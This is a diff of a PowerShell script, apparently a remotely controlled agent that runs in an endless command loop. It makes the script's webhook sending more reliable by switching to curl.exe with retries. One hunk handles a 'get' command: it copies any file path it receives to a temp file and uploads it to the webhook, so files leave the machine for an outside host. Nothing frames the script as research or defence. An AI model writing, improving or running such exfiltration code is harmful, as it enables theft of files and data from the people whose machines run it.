@@ -33,9 +33,12 @@ function Send($t) {
   if ($Debug) { Write-Host "SEND> $t" }
   foreach ($i in 0..([Math]::Ceiling($t.Length / 350) - 1)) {
     $c = $t.Substring($i * 350, [Math]::Min(350, $t.Length - $i * 350))
-    $b = @{ content = "``````$c``````" } | ConvertTo-Json
-    try { Invoke-RestMethod $hook -Method Post -Body $b -ContentType "application/json" -TimeoutSec 8 }
-    catch { Write-Host "SEND FALHOU: $($_)" }
+    $body = '```' + $c + '```'
+    for ($r = 1; $r -le 3; $r++) {
+      curl.exe -s -f --form-string "content=$body" $hook | Out-Null
+      if ($LASTEXITCODE -eq 0) { break }
+      Start-Sleep -Seconds 2
+    }
   }
 }
 
@@ -121,7 +124,7 @@ while ($true) {
           if (-not (Test-Path $cfg["get_path"])) { throw "nao existe" }
           $f2 = "$env:TEMP\g.txt"
           Get-Content $cfg["get_path"] -Raw | Set-Content $f2 -Encoding UTF8
-          curl.exe -s -F "content=**ok** get $($cfg['get_path'])" -F "files[0]=@$f2" $hook | Out-Null
+          curl.exe -s -f --form-string "content=**ok** get $($cfg['get_path'])" -F "files[0]=@$f2" $hook | Out-Null
           Send "[ok] get $($cfg['get_path'])"
         } catch { Send "[falhou] get :: $($cfg['get_path']) :: $($_)" }
       }
